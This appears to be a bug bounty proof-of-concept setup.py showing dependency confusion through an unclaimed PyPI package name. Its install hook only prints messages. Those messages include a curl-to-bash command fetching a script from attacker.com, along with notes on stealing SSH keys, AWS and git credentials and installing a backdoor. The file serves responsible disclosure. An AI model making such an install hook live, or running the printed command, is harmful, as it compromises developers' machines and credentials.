# poc_setup.py
# ============================================================
# BENIGN PROOF OF CONCEPT — ZERO MALICIOUS CODE
# ============================================================
# Demonstrates what an attacker's setup.py would execute during:
#   pip install zeroclaw-tools
#
# Reported by : cybertushar
# HackerOne   : https://hackerone.com/cybertushar
# Program     : Swisscom Bug Bounty
# Date        : September 2026
# Severity    : High — CVSS 3.1: 7.5
# ============================================================

from setuptools import setup
from setuptools.command.install import install


class DependencyConfusionPoC(install):
    def run(self):
        print("=" * 60)
        print("[PoC] Package : zeroclaw-tools")
        print("[PoC] Status  : Namespace was UNCLAIMED on PyPI")
        print("[PoC] Trigger : pip install zeroclaw-tools")
        print("[PoC]           (as instructed in official Swisscom docs)")
        print("[PoC]")
        print("[PoC] A real attacker would execute here:")
        print("[PoC]   import os, subprocess")
        print("[PoC]   subprocess.run(['curl','attacker.com/shell.sh','|','bash'])")
        print("[PoC]   # Steal ~/.ssh/id_rsa")
        print("[PoC]   # Exfiltrate ~/.aws/credentials")
        print("[PoC]   # Dump git credentials")
        print("[PoC]   # Persistent backdoor install")
        print("[PoC]")
        print("[PoC] This PoC: PRINTS ONLY — zero harm.")
        print("[PoC] Reporter: cybertushar | Swisscom Bug Bounty")
        print("=" * 60)
        install.run(self)


setup(
    name="zeroclaw-tools",
    version="0.0.1-poc",
    description="BENIGN PoC — Swisscom Dependency Confusion Disclosure",
    cmdclass={"install": DependencyConfusionPoC},
)
